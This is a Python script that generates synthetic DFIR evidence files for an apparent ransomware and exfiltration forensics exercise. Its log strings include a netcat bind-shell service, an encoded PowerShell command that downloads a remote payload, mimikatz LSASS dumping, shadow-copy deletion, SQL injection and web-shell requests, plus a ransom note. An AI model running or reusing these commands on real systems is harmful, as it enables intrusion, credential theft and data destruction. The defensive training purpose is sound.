import json
import os
import stat
from pathlib import Path
from typing import Dict

def ensure_writable(file_path: Path):
    if file_path.exists():
        try:
            os.chmod(file_path, stat.S_IWRITE | stat.S_IREAD)
        except Exception:
            pass

def generate_synthetic_evidence_files(target_dir: Path) -> Dict[str, Path]:
    """Generates the full set of realistic enterprise DFIR forensic evidence files."""
    target_dir.mkdir(parents=True, exist_ok=True)
    files = {}

    # 1. Windows Security Event Log (CSV Export)
    sec_csv = target_dir / "windows_security_eventlog.csv"
    ensure_writable(sec_csv)
    sec_csv.write_text(
        "timestamp,event_id,event_type,computer_name,user,domain,logon_type,src_ip,action,status,status_code,details\n"
        "2026-09-18T08:58:12Z,4625,Failed Logon,WS-FIN-091,analyst01,CORP.INTRA,10 (RemoteInteractive),198.51.100.24,Logon Attempt,Failure,0xC000006A,Bad user password entered via RDP\n"
        "2026-09-18T08:59:45Z,4625,Failed Logon,WS-FIN-091,analyst01,CORP.INTRA,10 (RemoteInteractive),198.51.100.24,Logon Attempt,Failure,0xC000006A,Bad user password entered via RDP\n"
        "2026-09-18T09:15:22Z,4624,Successful Logon,WS-FIN-091,analyst01,CORP.INTRA,10 (RemoteInteractive),198.51.100.24,User Logon,Success,0x0,Kerberos authentication successful from external IP\n"
        "2026-09-18T09:16:05Z,4672,Special Privileges Assigned,WS-FIN-091,analyst01,CORP.INTRA,2 (Interactive),127.0.0.1,Privilege Escalation,Success,0x0,SeDebugPrivilege and SeImpersonatePrivilege granted\n"
        "2026-09-18T09:25:40Z,7045,Service Installed,WS-FIN-091,SYSTEM,CORP.INTRA,Service,127.0.0.1,Persistence,Success,0x0,New Service: WindowsHealthCheckMonitor Path: C:\\Windows\\Temp\\nc.exe -L -p 4444 -e cmd.exe\n"
        "2026-09-18T09:30:10Z,1102,Audit Log Cleared,WS-FIN-091,analyst01,CORP.INTRA,Interactive,127.0.0.1,Defense Evasion,Warning,0x0,The Security audit log was cleared by user session\n",
        encoding="utf-8"
    )
    files["windows_security_eventlog.csv"] = sec_csv

    # 2. Sysmon Process Creation (Event ID 1)
    proc_csv = target_dir / "sysmon_process_creation.csv"
    ensure_writable(proc_csv)
    proc_csv.write_text(
        "timestamp,event_id,process,pid,parent_pid,parent_process,user,hashes,command_line,details\n"
        "2026-09-18T09:16:10Z,1,explorer.exe,2840,1012,userinit.exe,analyst01,SHA256=a8f4c2198031dbe84a0c8b6e2f59123049812739018247910283401928340192,C:\\Windows\\explorer.exe,Windows Desktop Shell Initialized\n"
        "2026-09-18T09:17:45Z,1,powershell.exe,4920,2840,explorer.exe,analyst01,SHA256=2b947c61c6b12a84b11f7c32e541092834019283401928340192834019283401,powershell.exe -ExecutionPolicy Bypass -NoProfile -W Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4AMgA0AC8AcABhAHkAbABvAGEAZAAuAGQAbABsACcALAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAGwAcgBcAHMAdgBjAGgAbwBzAHQALgBkAGwAbAAnACkA,Obfuscated encoded PowerShell stager download\n"
        "2026-09-18T09:18:12Z,1,whoami.exe,5120,4920,powershell.exe,analyst01,SHA256=8a7c290184b23891048b19283401928340192834019283401928340192834019,whoami.exe /priv /all,User privilege discovery & reconnaissance\n"
        "2026-09-18T09:19:05Z,1,rundll32.exe,5812,4920,powershell.exe,analyst01,SHA256=d4e5f60192834019283401928340192834019283401928340192834019283401,rundll32.exe C:\\Windows\\Temp\\svchost.dll,DllRegisterServer,Cobalt Strike reflective DLL injection stager executed\n"
        "2026-09-18T09:21:30Z,1,mimikatz.exe,6104,4920,powershell.exe,analyst01,SHA256=9f8e7d6c5b4a3102938475610293847561029384756102938475610293847561,mimikatz.exe privilege::debug sekurlsa::logonpasswords exit,Credential dumping from LSASS memory\n"
        "2026-09-18T09:27:15Z,1,vssadmin.exe,6450,4920,powershell.exe,analyst01,SHA256=3c4d5e6f7a8b9012345678901234567890123456789012345678901234567890,vssadmin.exe delete shadows /all /quiet,Volume Shadow Copies deleted to prevent system recovery\n",
        encoding="utf-8"
    )
    files["sysmon_process_creation.csv"] = proc_csv

    # 3. Zeek Network Traffic Log (Bro/Zeek format)
    net_log = target_dir / "zeek_network_traffic.log"
    ensure_writable(net_log)
    net_log.write_text(
        "#separator \\x09\n"
        "#set_separator ,\n"
        "#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state note\n"
        "2026-09-18T08:58:12Z Cu4K812Kj81 198.51.100.24 49821 192.168.1.105 3389 tcp rdp 4.21 1240 8920 SF RDP brute-force attempt\n"
        "2026-09-18T09:15:25Z Cu9K923Lj92 192.168.1.105 49152 192.168.1.10 88 tcp krb5 0.85 2450 3100 SF Kerberos TGT ticket exchange\n"
        "2026-09-18T09:18:02Z Cu1A045Mj03 192.168.1.105 53210 192.168.1.2 53 udp dns 0.04 74 128 SF DNS query for c2-gateway.darkcloud-apt.net\n"
        "2026-09-18T09:20:15Z Cu2B156Nj14 192.168.1.105 49321 198.51.100.24 443 tcp ssl 360.12 4580 12040 SF C2 beaconing TLS traffic established\n"
        "2026-09-18T09:24:50Z Cu3C267Oj25 192.168.1.105 49450 185.220.101.5 443 tcp ssl 180.45 28450192 1420 SF Bulk exfiltration TLS data transfer to external proxy\n",
        encoding="utf-8"
    )
    files["zeek_network_traffic.log"] = net_log

    # 4. Linux Auth & Syslog (sshd, sudo)
    auth_log = target_dir / "auth_sshd_syslog.log"
    ensure_writable(auth_log)
    auth_log.write_text(
        "2026-09-18T08:45:10Z srv-prod-db01 sshd[14280]: Failed password for invalid user admin from 198.51.100.24 port 49210 ssh2\n"
        "2026-09-18T08:45:14Z srv-prod-db01 sshd[14282]: Failed password for invalid user root from 198.51.100.24 port 49212 ssh2\n"
        "2026-09-18T09:14:02Z srv-prod-db01 sshd[14301]: Accepted password for backup_svc from 192.168.1.105 port 51022 ssh2\n"
        "2026-09-18T09:14:15Z srv-prod-db01 sudo: pam_unix(sudo:session): session opened for user root by backup_svc(uid=0)\n"
        "2026-09-18T09:14:30Z srv-prod-db01 sudo: backup_svc : TTY=pts/0 ; PWD=/var/lib/mysql ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases\n",
        encoding="utf-8"
    )
    files["auth_sshd_syslog.log"] = auth_log

    # 5. Web Server Access Log (Nginx/Apache Web Shell & Exploits)
    web_log = target_dir / "webserver_access.log"
    ensure_writable(web_log)
    web_log.write_text(
        '198.51.100.24 - - [18/Sep/2026:08:30:12 +0000] "GET /api/v1/auth/status HTTP/1.1" 200 452 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLMap/1.6"\n'
        '198.51.100.24 - - [18/Sep/2026:08:31:05 +0000] "POST /api/v1/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 500 1204 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLMap/1.6"\n'
        '198.51.100.24 - - [18/Sep/2026:08:42:20 +0000] "POST /uploads/2026/09/cmd_asp.aspx HTTP/1.1" 201 540 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\n'
        '198.51.100.24 - - [18/Sep/2026:08:43:00 +0000] "GET /uploads/2026/09/cmd_asp.aspx?cmd=whoami HTTP/1.1" 200 82 "https://portal.fintech-asia.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"\n',
        encoding="utf-8"
    )
    files["webserver_access.log"] = web_log

    # 6. USB Storage Registry Mount & Hardware Logs
    usb_csv = target_dir / "usbstor_registry_mount.csv"
    ensure_writable(usb_csv)
    usb_csv.write_text(
        "timestamp,device_name,vendor,product_id,serial_number,volume_guid,drive_letter,user,device_id,action\n"
        "2026-09-18T09:20:04Z,Ultra Fit USB 3.1,SanDisk,Prod_Ultra_Fit,SNDK-49102-X9,{a482b810-7210-482a-9e12-b91284a1004a},E:,analyst01,USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra_Fit&Rev_1.00\\04018742918491823901,Device Mounted / Volume Mounted\n"
        "2026-09-18T09:29:10Z,Ultra Fit USB 3.1,SanDisk,Prod_Ultra_Fit,SNDK-49102-X9,{a482b810-7210-482a-9e12-b91284a1004a},E:,analyst01,USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra_Fit&Rev_1.00\\04018742918491823901,Device Dismounted / Ejected\n",
        encoding="utf-8"
    )
    files["usbstor_registry_mount.csv"] = usb_csv

    # 7. File System Activity & Exfiltration Staging
    file_csv = target_dir / "file_exfiltration_staging.csv"
    ensure_writable(file_csv)
    file_csv.write_text(
        "timestamp,event_id,action,file_path,process,user,file_size_bytes,sha256_hash,details\n"
        "2026-09-18T09:22:15Z,FILE-0041,File Read,C:\\Corporate\\Financials\\Q4_Audit_Master_Confidential.xlsx,powershell.exe,analyst01,5824100,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,Confidential financial audit spreadsheet accessed\n"
        "2026-09-18T09:23:00Z,FILE-0042,File Read,C:\\Corporate\\Database\\customer_vault_pii.db,powershell.exe,analyst01,42190800,7d8e9f0123456789abcdef0123456789abcdef0123456789abcdef0123456789ab,Customer PII database read by PowerShell\n"
        "2026-09-18T09:27:10Z,FILE-0048,File Write,E:\\Staging\\exfil_archive_encrypted.7z,cmd.exe,analyst01,28450192,f2d1e0c9b8a70654321fedcba0987654321fedcba0987654321fedcba0987654,Encrypted exfiltration archive created on removable drive E:\n"
        "2026-09-18T09:28:45Z,FILE-0052,File Rename / Encrypt,C:\\Corporate\\Financials\\Q4_Audit_Master_Confidential.xlsx.locked,svchost.dll,analyst01,5824100,99a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8,Ransomware payload encrypted original file with .locked extension\n",
        encoding="utf-8"
    )
    files["file_exfiltration_staging.csv"] = file_csv

    # 8. Threat Actor Ransom Note (Text artifact)
    ransom_txt = target_dir / "threat_actor_ransom_note.txt"
    ensure_writable(ransom_txt)
    ransom_txt.write_text(
        "=== YOUR CORPORATE NETWORK HAS BEEN ENCRYPTED AND DATA EXFILTRATED ===\n\n"
        "Incident Case: VICTIM-FINTECH-CORP-9482\n"
        "All your critical files, databases, financial records, and PII vaults have been encrypted with military-grade AES-256 + RSA-4096.\n"
        "In addition, over 28 GB of sensitive customer and financial data was downloaded to our private leak servers.\n\n"
        "--- HOW TO RESTORE YOUR DATA ---\n"
        "1. Do not attempt to rename, delete, or decrypt files using third-party software; this will result in permanent data destruction.\n"
        "2. Download TOR Browser and visit our private negotiation portal:\n"
        "   http://darkvault7wexilq9z3p2l0k8j4m5n6o7.onion/negotiation?id=VICTIM-FINTECH-CORP-9482\n"
        "3. Alternative contact email: blackvault_ransom_ops@protonmail.com\n"
        "4. You have 72 hours before your confidential data is published to the public leak blog.\n\n"
        "Threat Group: DarkVault Ransomware Syndicate\n",
        encoding="utf-8"
    )
    files["threat_actor_ransom_note.txt"] = ransom_txt

    # 9. Enterprise EDR Host Snapshot & Detection Telemetry (JSON)
    sys_json = target_dir / "edr_host_telemetry.json"
    ensure_writable(sys_json)
    sys_data = {
        "edr_agent_metadata": {
            "agent_id": "EDR-AGT-90184-SEC",
            "hostname": "WS-FIN-091",
            "fqdn": "ws-fin-091.corp.financial.intra",
            "os_name": "Microsoft Windows 11 Enterprise (64-bit)",
            "os_build": "10.0.22631.3296",
            "domain": "CORP.INTRA",
            "primary_ip": "192.168.1.105",
            "mac_address": "00:50:56:C0:00:08",
            "last_reboot_utc": "2026-09-18T06:00:00Z",
            "active_compromised_user": "analyst01"
        },
        "critical_edr_alerts": [
            {
                "alert_id": "EDR-ALT-4091",
                "timestamp": "2026-09-18T09:17:45Z",
                "severity": "CRITICAL",
                "technique": "T1059.001 - PowerShell Script Execution",
                "description": "Obfuscated Base64-encoded command line spawned from explorer.exe downloading external stager",
                "mitre_tactic": "Execution"
            },
            {
                "alert_id": "EDR-ALT-4094",
                "timestamp": "2026-09-18T09:21:30Z",
                "severity": "CRITICAL",
                "technique": "T1003.001 - LSASS Memory Dumping",
                "description": "Mimikatz privilege::debug invocation detected in process tree",
                "mitre_tactic": "Credential Access"
            },
            {
                "alert_id": "EDR-ALT-4099",
                "timestamp": "2026-09-18T09:24:50Z",
                "severity": "HIGH",
                "technique": "T1048.003 - Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol",
                "description": "High volume outbound TLS data transfer (28.4 MB) to known bulletproof hosting IP 185.220.101.5",
                "mitre_tactic": "Exfiltration"
            }
        ],
        "threat_intel_iocs": [
            {"type": "ip", "value": "198.51.100.24", "threat_name": "DarkVault C2 Primary IP", "confidence": 0.98},
            {"type": "ip", "value": "185.220.101.5", "threat_name": "DarkVault Exfiltration Proxy", "confidence": 0.95},
            {"type": "domain", "value": "c2-gateway.darkcloud-apt.net", "threat_name": "Cobalt Strike Dynamic DNS", "confidence": 0.99},
            {"type": "sha256", "value": "9f8e7d6c5b4a3102938475610293847561029384756102938475610293847561", "threat_name": "Mimikatz Dump Executable", "confidence": 1.0}
        ]
    }
    sys_json.write_text(json.dumps(sys_data, indent=2), encoding="utf-8")
    files["edr_host_telemetry.json"] = sys_json

    return files
